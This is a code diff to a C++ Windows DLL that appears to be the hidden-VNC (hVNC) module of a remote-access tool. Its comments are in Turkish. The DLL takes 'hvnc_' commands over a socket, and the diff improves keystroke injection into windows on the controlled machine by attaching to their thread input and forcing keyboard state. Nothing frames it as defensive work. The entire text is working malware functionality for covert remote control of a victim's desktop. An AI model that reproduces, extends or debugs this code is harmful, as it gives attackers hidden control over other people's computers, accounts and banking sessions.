@@ -151,7 +151,7 @@ static atomic_bool g_forceFullFrame(false);
 static bool g_key_shift = false;
 static bool g_key_ctrl  = false;
 static bool g_key_alt   = false;
-
+static HWND g_hAttachedThreadWnd = NULL;
 // -----------------------------------------------------------------------
 
 static bool safe_send_json(SOCKET sock, const json& data) {
@@ -921,6 +921,52 @@ static HWND GetFocusedWindow() {
     return hTarget;
 }
 
+static DWORD g_attachedThreadId = 0;
+
+static void sync_keyboard_state(HWND hTarget) {
+    if (!hTarget || !IsWindow(hTarget)) return;
+    DWORD targetThread = GetWindowThreadProcessId(hTarget, NULL);
+    DWORD myThread = GetCurrentThreadId();
+
+    if (g_attachedThreadId != targetThread) {
+        if (g_attachedThreadId != 0 && g_attachedThreadId != myThread) {
+            AttachThreadInput(myThread, g_attachedThreadId, FALSE);
+        }
+        if (targetThread != 0 && targetThread != myThread) {
+            if (AttachThreadInput(myThread, targetThread, TRUE)) {
+                g_attachedThreadId = targetThread;
+            } else {
+                g_attachedThreadId = 0;
+            }
+        } else {
+            g_attachedThreadId = 0;
+        }
+        g_hAttachedThreadWnd = hTarget;
+    }
+
+    BYTE keyState[256];
+    if (GetKeyboardState(keyState)) {
+        keyState[VK_SHIFT]    = g_key_shift ? 0x80 : 0;
+        keyState[VK_LSHIFT]   = g_key_shift ? 0x80 : 0;
+        keyState[VK_RSHIFT]   = g_key_shift ? 0x80 : 0;
+        keyState[VK_CONTROL]  = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_LCONTROL] = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_RCONTROL] = g_key_ctrl  ? 0x80 : 0;
+        keyState[VK_MENU]     = g_key_alt   ? 0x80 : 0;
+        keyState[VK_LMENU]    = g_key_alt   ? 0x80 : 0;
+        keyState[VK_RMENU]    = g_key_alt   ? 0x80 : 0;
+        SetKeyboardState(keyState);
+    }
+}
+
+static bool is_character_key(int vk) {
+    if (vk >= '0' && vk <= '9') return true;
+    if (vk >= 'A' && vk <= 'Z') return true;
+    if (vk >= VK_OEM_1 && vk <= VK_OEM_7) return true;
+    if (vk >= VK_NUMPAD0 && vk <= VK_DIVIDE) return true;
+    return false;
+}
+
 // -----------------------------------------------------------------------
 //  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
 // -----------------------------------------------------------------------
@@ -944,26 +990,61 @@ static void input_loop() {
 
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
-            int vk = cmd.value("keycode", 0);
+            int vk_in = cmd.value("keycode", 0);
             HWND hTarget = GetFocusedWindow();
             if (!hTarget) continue;
 
+            // Ensure our thread has a message queue for AttachThreadInput
+            MSG dummy_msg;
+            PeekMessage(&dummy_msg, NULL, 0, 0, PM_NOREMOVE);
+
+            sync_keyboard_state(hTarget);
+
             if (action == "hvnc_keydown") {
-                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = true;
-                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = true;
-                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = true;
+                if (vk_in == VK_SHIFT || vk_in == VK_LSHIFT || vk_in == VK_RSHIFT) g_key_shift = true;
+                if (vk_in == VK_CONTROL || vk_in == VK_LCONTROL || vk_in == VK_RCONTROL) g_key_ctrl = true;
+                if (vk_in == VK_MENU || vk_in == VK_LMENU || vk_in == VK_RMENU) g_key_alt = true;
 
-                UINT msg = g_key_alt ? WM_SYSKEYDOWN : WM_KEYDOWN;
-                PostMessageW(hTarget, msg, vk, make_lparam(vk, false, is_extended_key(vk), g_key_alt));
+                sync_keyboard_state(hTarget);
+
+                // Optimized input: Skip WM_KEYDOWN for character keys unless Ctrl/Alt is held.
+                // This ensures TranslateMessage doesn't produce an incorrect case 'WM_CHAR'
+                // due to race conditions in synchronous keyboard state.
+                bool isShortcut = g_key_ctrl || g_key_alt;
+                bool isModifier = (vk_in == VK_SHIFT || vk_in == VK_LSHIFT || vk_in == VK_RSHIFT ||
+                                   vk_in == VK_CONTROL || vk_in == VK_LCONTROL || vk_in == VK_RCONTROL ||
+                                   vk_in == VK_MENU || vk_in == VK_LMENU || vk_in == VK_RMENU);
+
+                if (isShortcut || isModifier || !is_character_key(vk_in)) {
+                    UINT msg = g_key_alt ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                    LPARAM lp = make_lparam(vk_in, false, is_extended_key(vk_in), g_key_alt);
+                    if (isModifier) {
+                        SendMessageTimeoutW(hTarget, msg, vk_in, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                    } else {
+                        PostMessageW(hTarget, msg, vk_in, lp);
+                    }
+                }
             } else if (action == "hvnc_keyup") {
-                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = false;
-                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = false;
-                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = false;
+                if (vk_in == VK_SHIFT || vk_in == VK_LSHIFT || vk_in == VK_RSHIFT) g_key_shift = false;
+                if (vk_in == VK_CONTROL || vk_in == VK_LCONTROL || vk_in == VK_RCONTROL) g_key_ctrl = false;
+                if (vk_in == VK_MENU || vk_in == VK_LMENU || vk_in == VK_RMENU) g_key_alt = false;
 
-                UINT msg = (g_key_alt || (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU)) ? WM_SYSKEYUP : WM_KEYUP;
-                PostMessageW(hTarget, msg, vk, make_lparam(vk, true, is_extended_key(vk), g_key_alt));
+                bool isModifier = (vk_in == VK_SHIFT || vk_in == VK_LSHIFT || vk_in == VK_RSHIFT ||
+                                   vk_in == VK_CONTROL || vk_in == VK_LCONTROL || vk_in == VK_RCONTROL ||
+                                   vk_in == VK_MENU || vk_in == VK_LMENU || vk_in == VK_RMENU);
+
+                UINT msg = (g_key_alt || (vk_in == VK_MENU || vk_in == VK_LMENU || vk_in == VK_RMENU)) ? WM_SYSKEYUP : WM_KEYUP;
+                LPARAM lp = make_lparam(vk_in, true, is_extended_key(vk_in), g_key_alt);
+                if (isModifier) {
+                    SendMessageTimeoutW(hTarget, msg, vk_in, lp, SMTO_ABORTIFHUNG, 250, NULL);
+                } else {
+                    PostMessageW(hTarget, msg, vk_in, lp);
+                }
+                sync_keyboard_state(hTarget);
             } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, vk, 1);
+                SHORT res = VkKeyScanW((WCHAR)vk_in);
+                UINT vkey = (res != -1) ? (res & 0xFF) : 0;
+                PostMessageW(hTarget, WM_CHAR, vk_in, make_lparam(vkey, false, is_extended_key(vkey), g_key_alt));
             }
 
             g_forceFullFrame = true;
@@ -1150,6 +1231,12 @@ static void input_loop() {
             continue;
         }
     }
+
+    if (g_attachedThreadId != 0) {
+        AttachThreadInput(GetCurrentThreadId(), g_attachedThreadId, FALSE);
+    }
+    g_attachedThreadId = 0;
+    g_hAttachedThreadWnd = NULL;
 }
 
 static wstring utf8_to_wstring(const string& str) {
@@ -1220,6 +1307,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_key_shift = false;
             g_key_ctrl = false;
             g_key_alt = false;
+            g_hAttachedThreadWnd = NULL;
         } else if (action == "hvnc_quality") {
             lock_guard<mutex> lock(g_captureMutex);
             g_scalePercent = cmd.value("quality", 50);
